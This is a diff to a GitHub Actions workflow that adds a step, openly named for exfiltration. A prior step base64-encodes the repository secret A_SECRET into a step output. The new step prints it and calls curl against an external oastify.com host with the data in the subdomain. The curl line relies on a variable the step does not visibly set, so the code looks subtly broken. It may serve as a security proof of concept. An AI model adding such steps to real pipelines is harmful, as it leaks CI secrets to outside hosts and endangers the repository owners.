@@ -23,8 +23,11 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Run a one-line script
-        id: exfil
+        id: "exfil"
         run: |
          echo EXFIL=${{ secrets.A_SECRET }} | base64 >> $GITHUB_OUTPUT
-         echo ${{ steps.exfil.outputs.EXFIL }}
+
+      - name: Show output and exfil data
+        run: |
+          echo " OUTPUT [${{steps.exfil.outputs.EXFIL}}]"
           curl -v http://$EXFIL.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
